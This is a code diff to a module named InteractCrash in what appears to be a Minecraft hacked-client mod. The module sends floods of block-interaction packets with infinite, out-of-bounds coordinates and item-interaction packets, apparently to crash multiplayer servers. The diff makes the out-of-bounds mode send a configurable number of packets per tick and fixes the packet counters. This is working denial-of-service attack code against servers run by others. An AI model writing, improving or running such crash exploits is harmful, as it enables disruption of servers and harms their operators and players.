@@ -75,6 +75,9 @@ public class InteractCrash extends Module {
         return new Vec3d(random.nextInt(0xFFFFFF), 255, random.nextInt(0xFFFFFF));
     }
 
+    @Override
+    public void onActivate() { ticksActive = 0; packetsSent = 0; }
+
     @EventHandler
     private void onTick(TickEvent.Post event) {
         if (mc.player == null) return;
@@ -90,14 +93,17 @@ public class InteractCrash extends Module {
             }
             case OOB -> {
                 Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255, Double.NEGATIVE_INFINITY);
-                mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(
-                    Hand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored(oob), false), 0));
-            packetsSent++;
+                for (int i = 0; i < amount.get(); i++) {
+                    mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(
+                        Hand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored(oob), false), 0));
+                    packetsSent++;
+                }
             }
             case Item -> {
-                for (int i = 0; i < amount.get(); i++)
+                for (int i = 0; i < amount.get(); i++) {
                     mc.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0, 0f, 0f));
-            packetsSent++;
+                    packetsSent++;
+                }
             }
         }
     }
